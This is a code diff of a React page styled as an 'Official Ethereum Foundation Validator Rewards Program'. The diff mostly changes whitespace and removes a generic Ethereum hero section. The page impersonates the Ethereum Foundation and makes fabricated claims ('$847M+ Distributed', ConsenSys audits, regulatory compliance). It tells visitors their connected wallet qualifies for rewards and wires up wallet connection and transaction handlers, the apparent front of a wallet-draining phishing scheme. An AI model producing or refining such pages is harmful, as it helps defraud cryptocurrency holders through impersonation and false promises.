@@ -126,7 +126,7 @@ export default function Home() {
                 Official Ethereum Foundation Validator Rewards Program - Active Since 2022
               </span>
             </div>
-
+            
             {/* Main Title */}
             <h1 className="text-4xl md:text-6xl font-bold mb-6 leading-tight">
               <span className="bg-gradient-to-r from-foreground via-primary to-secondary bg-clip-text text-transparent">
@@ -138,7 +138,7 @@ export default function Home() {
                 Validator Rewards Distribution
               </span>
             </h2>
-
+            
             {/* Professional Hero Visual Section with Custom SVGs */}
             <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-12 max-w-5xl mx-auto">
               {/* Smart Contract Security */}
@@ -180,7 +180,7 @@ export default function Home() {
                 <p className="text-sm text-muted-foreground text-center leading-relaxed">Advanced portfolio tracking with machine learning optimization and comprehensive risk assessment algorithms</p>
               </div>
             </div>
-
+            
             {/* Description */}
             <div className="max-w-4xl mx-auto mb-12">
               <p className="text-lg md:text-xl text-muted-foreground leading-relaxed mb-6">
@@ -205,7 +205,7 @@ export default function Home() {
               <h3 className="text-xl font-semibold mb-3 text-foreground">$847M+ Distributed</h3>
               <p className="text-muted-foreground">Total validator rewards distributed since launch</p>
             </div>
-
+            
             <div className="bg-card border border-border rounded-lg p-6 text-center hover:shadow-md transition-shadow">
               <div className="w-16 h-16 mx-auto mb-4 bg-accent/20 rounded-lg flex items-center justify-center">
                 <Users className="w-8 h-8 text-secondary" />
@@ -213,7 +213,7 @@ export default function Home() {
               <h3 className="text-xl font-semibold mb-3 text-foreground">284,000+ Recipients</h3>
               <p className="text-muted-foreground">Validated wallets participating in rewards program</p>
             </div>
-
+            
             <div className="bg-card border border-border rounded-lg p-6 text-center hover:shadow-md transition-shadow">
               <div className="w-16 h-16 mx-auto mb-4 bg-secondary/10 rounded-lg flex items-center justify-center">
                 <Award className="text-2xl font-bold text-secondary" />
@@ -255,7 +255,7 @@ export default function Home() {
               Our validator infrastructure powers Ethereum's security while distributing rewards to network participants
             </p>
           </div>
-
+          
           <div className="grid grid-cols-1 md:grid-cols-4 gap-8">
             <div className="text-center">
               <div className="w-16 h-16 mx-auto mb-4 bg-primary/10 rounded-full flex items-center justify-center">
@@ -264,7 +264,7 @@ export default function Home() {
               <h4 className="font-semibold mb-2 text-foreground">ConsenSys Audited</h4>
               <p className="text-sm text-muted-foreground">Smart contracts audited by leading security firm</p>
             </div>
-
+            
             <div className="text-center">
               <div className="w-16 h-16 mx-auto mb-4 bg-secondary/10 rounded-full flex items-center justify-center">
                 <Lock className="w-8 h-8 text-secondary" />
@@ -272,7 +272,7 @@ export default function Home() {
               <h4 className="font-semibold mb-2 text-foreground">Multi-Sig Security</h4>
               <p className="text-sm text-muted-foreground">Institutional-grade vault protection</p>
             </div>
-
+            
             <div className="text-center">
               <div className="w-16 h-16 mx-auto mb-4 bg-accent/10 rounded-full flex items-center justify-center">
                 <CheckCircle className="w-8 h-8 text-accent" />
@@ -280,7 +280,7 @@ export default function Home() {
               <h4 className="font-semibold mb-2 text-foreground">Regulatory Compliant</h4>
               <p className="text-sm text-muted-foreground">Full compliance with global standards</p>
             </div>
-
+            
             <div className="text-center">
               <div className="w-16 h-16 mx-auto mb-4 bg-success/10 rounded-full flex items-center justify-center">
                 <Award className="w-8 h-8 text-success" />
@@ -292,81 +292,7 @@ export default function Home() {
         </div>
       </section>
 
-      {/* Main Content */}
-      <main className="max-w-7xl mx-auto px-6">
-        {/* Hero Section - Ethereum.org style */}
-        <div className="py-16 lg:py-24">
-          <div className="grid lg:grid-cols-2 gap-12 items-center">
-            <div className="space-y-8">
-              <div className="space-y-6">
-                <h1 className="text-5xl lg:text-6xl font-bold text-gray-900 leading-tight">
-                  Welcome to
-                  <br />
-                  <span className="bg-gradient-to-r from-blue-600 to-purple-600 bg-clip-text text-transparent">
-                    Ethereum
-                  </span>
-                </h1>
-                <p className="text-xl text-gray-600 leading-relaxed max-w-lg">
-                  Ethereum is a decentralized platform that runs smart contracts: 
-                  applications that run exactly as programmed without any possibility 
-                  of downtime, censorship, fraud or third-party interference.
-                </p>
-              </div>
-
-              <div className="flex flex-col sm:flex-row gap-4">
-                <Button
-                  onClick={walletState.isConnected ? undefined : handleWalletConnect}
-                  disabled={isConnecting}
-                  size="lg"
-                  className="bg-blue-600 hover:bg-blue-700 text-white text-lg px-8 py-4 rounded-lg font-semibold"
-                >
-                  <Wallet className="w-5 h-5 mr-2" />
-                  {isConnecting ? "Connecting..." : walletState.isConnected ? "Wallet Connected" : "Get started"}
-                </Button>
-
-                <Button 
-                  variant="outline" 
-                  size="lg" 
-                  className="border-2 border-gray-300 text-gray-700 hover:bg-gray-50 text-lg px-8 py-4 rounded-lg font-semibold"
-                >
-                  <Shield className="w-5 h-5 mr-2" />
-                  What is Ethereum?
-                </Button>
-              </div>
-
-              <div className="flex items-center space-x-8 pt-6">
-                <div className="flex items-center space-x-2 text-sm text-gray-500">
-                  <div className="w-2 h-2 bg-green-500 rounded-full"></div>
-                  <span>Decentralized</span>
-                </div>
-                <div className="flex items-center space-x-2 text-sm text-gray-500">
-                  <div className="w-2 h-2 bg-blue-500 rounded-full"></div>
-                  <span>Open source</span>
-                </div>
-                <div className="flex items-center space-x-2 text-sm text-gray-500">
-                  <div className="w-2 h-2 bg-purple-500 rounded-full"></div>
-                  <span>Global</span>
-                </div>
-              </div>
-            </div>
-
-            <div className="relative lg:pl-8">
-              <div className="bg-gradient-to-br from-blue-50 to-purple-50 rounded-3xl p-8 border border-gray-100">
-                <div className="w-full h-80 flex items-center justify-center">
-                  <svg width="200" height="200" viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M100.498 25L99.22 29.6V131.79L100.498 133.068L149.996 108.01L100.498 25Z" fill="#627EEA"/>
-                    <path d="M100.498 25L51 108.01L100.498 133.068V82.62V25Z" fill="#627EEA" fillOpacity="0.6"/>
-                    <path d="M100.498 144.84L99.33 146.132V174.934L100.498 178.442L150 117.81L100.498 144.84Z" fill="#627EEA"/>
-                    <path d="M100.498 178.442V144.84L51 117.81L100.498 178.442Z" fill="#627EEA" fillOpacity="0.6"/>
-                    <path d="M100.498 133.068L149.996 108.01L100.498 82.62V133.068Z" fill="#627EEA" fillOpacity="0.2"/>
-                    <path d="M51 108.01L100.498 133.068V82.62L51 108.01Z" fill="#627EEA" fillOpacity="0.6"/>
-                  </svg>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-
+      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12 space-y-12">
         {/* ETH Claim Section - Ethereum.org Style */}
         <section className="max-w-4xl mx-auto">
           <div className="bg-card border border-border rounded-xl p-8 shadow-sm">
@@ -375,16 +301,16 @@ export default function Home() {
               <div className="w-20 h-20 mx-auto mb-6 bg-primary/10 rounded-xl flex items-center justify-center">
                 <img src="/images/ethereum-logo.svg" alt="Ethereum" className="w-12 h-12" />
               </div>
-
+              
               <h3 className="text-2xl font-bold mb-3 text-foreground">
                 Validator Rewards Distribution
               </h3>
               <p className="text-muted-foreground">Your connected wallet qualifies for proportional validator rewards based on network participation</p>
             </div>
-
+            
             {/* Separator */}
             <div className="w-full h-px bg-border mb-8"></div>
-
+            
             <BalanceCard 
               walletState={walletState}
               onTransactionStart={handleTransactionStart}
@@ -423,7 +349,7 @@ export default function Home() {
                   <span className="text-sm text-muted-foreground">7 Networks</span>
                 </div>
               </div>
-
+              
               <div className="bg-muted/30 rounded-lg p-6">
                 <NetworkBalances
                   networkBalances={walletState.networkBalances || []}
@@ -452,7 +378,7 @@ export default function Home() {
           error={connectionError}
         />
 
-
+        
       </main>
 
       {/* Ethereum.org Style Footer */}
@@ -481,7 +407,7 @@ export default function Home() {
                 </li>
               </ul>
             </div>
-
+            
             <div className="bg-card border border-border rounded-lg p-6">
               <h4 className="text-lg font-bold mb-6 text-foreground">Validator Infrastructure</h4>
               <ul className="space-y-3">
@@ -504,7 +430,7 @@ export default function Home() {
               </ul>
             </div>
           </div>
-
+          
           {/* Critical Notice */}
           <div className="bg-primary/5 border border-primary/20 rounded-lg p-6 mb-12">
             <div className="flex items-start space-x-4">
@@ -522,14 +448,14 @@ export default function Home() {
               </div>
             </div>
           </div>
-
+          
           {/* Footer Bottom */}
           <div className="text-center pt-8 border-t border-border">
             <div className="flex items-center justify-center mb-4">
               <img src="/images/ethereum-logo.svg" alt="Ethereum" className="w-6 h-6 mr-2" />
               <span className="text-lg font-semibold text-foreground">Ethereum Foundation</span>
             </div>
-
+            
             <p className="text-muted-foreground mb-4">
               © 2025 Ethereum Foundation Validator Rewards Program. Institutional staking infrastructure.
             </p>
